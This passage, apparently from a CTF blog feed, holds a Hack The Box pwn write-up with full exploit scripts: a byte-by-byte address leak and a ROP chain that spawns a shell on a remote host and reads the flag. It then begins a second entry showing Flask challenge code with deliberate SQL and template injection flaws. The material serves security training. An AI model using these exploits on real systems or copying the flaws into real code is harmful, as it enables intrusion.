length:'</span>)</span><br><span class="line">    p.sendline(str(mun))</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Enter username:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess_libc</span><span class="params">(n)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">elf_link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>+<span class="number">8</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0xe6c7e execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#while True:</span></span><br><span class="line"><span class="comment">#    try :</span></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">            p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">            p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">        stdout_addr=link()</span><br><span class="line">        <span class="comment">#x=finder('_IO_2_1_stdout_',stdout_addr,num=1)</span></span><br><span class="line">        elf_base=elf_link()<span class="number">-0x25fe</span></span><br><span class="line">        libc_base=stdout_addr<span class="number">-0x1ec6a0</span></span><br><span class="line">        system_addr=<span class="number">0x000000000055410</span>+libc_base</span><br><span class="line">        gets_addr= <span class="number">0x86af0</span>+libc_base</span><br><span class="line">        puts_addr=<span class="number">0x0000000000875a0</span>+libc_base</span><br><span class="line">        rsi_ret=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">        rdi_ret=<span class="number">0x0000000000026b72</span>+libc_base</span><br><span class="line">        </span><br><span class="line">        bin_sh_addr=elf_base+<span class="number">0x4000</span>+<span class="number">0x100</span></span><br><span class="line">        ret=<span class="number">0x0000000000025679</span>+libc_base</span><br><span class="line">        log.info(<span class="string">'bin_sh_addr:'</span>+hex(bin_sh_addr))</span><br><span class="line">        log.info(<span class="string">'libc_base'</span>+hex(libc_base))</span><br><span class="line">        log.info(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        p.recv(timeout=<span class="number">4</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.sendline(str(<span class="number">0x80</span>))<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">'w'</span>*(<span class="number">0x40</span>)+chr(<span class="number">0x20</span>)*<span class="number">0x78</span>+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(gets_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(puts_addr)+p64((rdi_ret))+p64(bin_sh_addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(system_addr))</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="remote-problem"><a href="#remote-problem" class="headerlink" title="remote_problem"></a>remote_problem</h2><p>看上面最初exp时间，可以看到我很久就在本地解决出来但是什么最近才打通远程呢？</p><p>根本原因是netwrok，与htb靶机交换时间太长。这是一个非常影响体验感的问题。在远程中出错也无法即时排查。(ps:应该给个dockerfile)</p><p>其次，我leak数据过多了，不仅要leak libc地址，还有leak elf的地址。我在想只需要libc地址。同时，由于不了解自身本地环境与远程机的寄存器和栈环境，是否完全相同也无法轻易使用 one_gadget 。但查阅资料发现libc中自身存在一个<code>/bin/sh</code>后门字符串。我们可以通过libc-database来查询得到这个地址，当然也可以用ROPgadget来找到这个地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary .&#x2F;glibc&#x2F;libc.so.6  --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x00000000001b75aa : &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>于是我用我写的工具libcfind(<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher_plus</a>)来自动查询libc-database，验证本地与远程libc环境是否相同。</p><p>同时，我们用libc中自身存在一个<code>/bin/sh</code>后门字符串，就不需要leak 程序的基地址只需要libc的基础地址。</p><p>由于就算开了PIE与NX，一个libc函数在x64在一位一定是<code>\x7f</code>,末位一定是固定的。这样我们就可以少leak俩个位。加上不leak 程序的基地址。我们现在只需要leak 4位数大幅减少leak时间。让我们有更多机会试one_gadget 和system地址对齐的错。</p><h2 id="remote-exp"><a href="#remote-exp" class="headerlink" title="remote_exp"></a>remote_exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./loginsim'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#context.arch=e.arch</span></span><br><span class="line">ip_port=[<span class="string">'167.99.205.117'</span>,<span class="number">30301</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(mun,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username length:'</span>)</span><br><span class="line">    p.sendline(str(mun))</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Enter username:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7f</span>  </span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xa0</span></span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0xe6c7e execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        <span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">            p=process(elf)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line">        stdout_addr=link()</span><br><span class="line">        x=finder(<span class="string">'_IO_2_1_stdout_'</span>,stdout_addr,num=<span class="number">1</span>)</span><br><span class="line">        libc_base=stdout_addr<span class="number">-0x1ec6a0</span></span><br><span class="line">        system_addr=<span class="number">0x000000000055410</span>+libc_base</span><br><span class="line">        puts_addr=<span class="number">0x0000000000875a0</span>+libc_base</span><br><span class="line">        <span class="comment">#0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line">        rdi_ret=<span class="number">0x000000000011c371</span>+libc_base</span><br><span class="line">        sh_addr=<span class="number">0x00000000001b5661</span>+libc_base</span><br><span class="line">        ret=<span class="number">0x0000000000025679</span>+libc_base</span><br><span class="line">        log.info(<span class="string">'sh:'</span>+hex(sh_addr))</span><br><span class="line">        log.info(hex(sh_addr))</span><br><span class="line">        log.info(hex(libc_base))</span><br><span class="line">        debug()</span><br><span class="line">        p.recv(timeout=<span class="number">4</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.sendline(str(<span class="number">0x80</span>))<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        rsi_ret=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">        <span class="comment">#0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line">        rdi_ret=<span class="number">0x0000000000026b72</span>+libc_base</span><br><span class="line">        p.sendline(<span class="string">'w'</span>*(<span class="number">0x40</span>)+chr(<span class="number">0x20</span>)*<span class="number">0x78</span>+p64((rdi_ret))+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+<span class="string">'x'</span>*<span class="number">0x10</span>+</span><br><span class="line">chr(<span class="number">0x0</span>)*<span class="number">8</span>+<span class="string">'\x00'</span>*<span class="number">0x100</span>)<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        print(p.recv(timeout=<span class="number">4</span>))        </span><br><span class="line">        p.sendline(<span class="string">'ls'</span>)</span><br><span class="line">        print(p.recvline(timeout=<span class="number">2</span>)) </span><br><span class="line">        <span class="comment">#p.interactive()</span></span><br><span class="line">        p.sendline(<span class="string">'cat /home/pwn_login_simulator/f*'</span>)</span><br><span class="line">        p.sendline(<span class="string">'cat /f*'</span>)</span><br><span class="line">        p.sendline(<span class="string">'cat fla*'</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一道意义题，让我学会了很多…比如明白了大佬总再说“F5 只是看乐子，干正事还是得看汇编”</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-baby_ninja_jinja-web-challenge-wp</title>
    <link href="lexsd6.github.io/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/"/>
    <id>lexsd6.github.io/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/</id>
    <published>2022-03-26T14:51:01.713Z</published>
    <updated>2022-03-26T16:21:09.212Z</updated>
    
    <content type="html"><![CDATA[<p>单纯的python ssti 已经是过去了,但是偶尔刷下还是有意思…<a id="more"></a></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>进入页面，发现有一个输入接口：</p><p><img src="image-20220326224004255.png" alt="image-20220326224004255"></p><p>按下F12查看源码：发现提示有<code>/debug</code> 路由。找到了源码提示:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, render_template, request, Response, render_template_string, g</span><br><span class="line"><span class="keyword">import</span> functools, sqlite3, os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line">acc_tmpl = <span class="string">'''&#123;% extends 'index.html' %&#125;</span></span><br><span class="line"><span class="string">&#123;% block content %&#125;</span></span><br><span class="line"><span class="string">&lt;h3&gt;baby_ninja joined, total number of rebels: reb_num&lt;br&gt;</span></span><br><span class="line"><span class="string">&#123;% endblock %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(<span class="string">'/tmp/ninjas.db'</span>)</span><br><span class="line">        db.isolation_level = <span class="literal">None</span></span><br><span class="line">        db.row_factory = sqlite3.Row</span><br><span class="line">        db.text_factory = (<span class="keyword">lambda</span> s: s.replace(<span class="string">'&#123;&#123;'</span>, <span class="string">''</span>).</span><br><span class="line">            replace(<span class="string">"'"</span>, <span class="string">'&amp;#x27;'</span>).</span><br><span class="line">            replace(<span class="string">'"'</span>, <span class="string">'&amp;quot;'</span>).</span><br><span class="line">            replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).</span><br><span class="line">            replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_db</span><span class="params">(query, args=<span class="params">()</span>, one=False)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        cur = get_db().execute(query, args)</span><br><span class="line">        rv = [dict((cur.description[idx][<span class="number">0</span>], str(value)) \</span><br><span class="line">            <span class="keyword">for</span> idx, value <span class="keyword">in</span> enumerate(row)) <span class="keyword">for</span> row <span class="keyword">in</span> cur.fetchall()]</span><br><span class="line">        <span class="keyword">return</span> (rv[<span class="number">0</span>] <span class="keyword">if</span> rv <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">if</span> one <span class="keyword">else</span> rv</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.open_resource(<span class="string">'schema.sql'</span>, mode=<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        get_db().cursor().executescript(f.read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_connection</span><span class="params">(exception)</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: db.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rite_of_passage</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">born2pwn</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">        name = request.args.get(<span class="string">'name'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            query_db(<span class="string">'INSERT INTO ninjas (name) VALUES ("%s")'</span> % name)</span><br><span class="line"></span><br><span class="line">            report = render_template_string(acc_tmpl.</span><br><span class="line">                replace(<span class="string">'baby_ninja'</span>, query_db(<span class="string">'SELECT name FROM ninjas ORDER BY id DESC'</span>, one=<span class="literal">True</span>)[<span class="string">'name'</span>]).</span><br><span class="line">                replace(<span class="string">'reb_num'</span>, query_db(<span class="string">'SELECT COUNT(id) FROM ninjas'</span>, one=<span class="literal">True</span>).itervalues().next())</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">'leader'</span>): </span><br><span class="line">                <span class="keyword">return</span> report</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'welcome.jinja2'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> 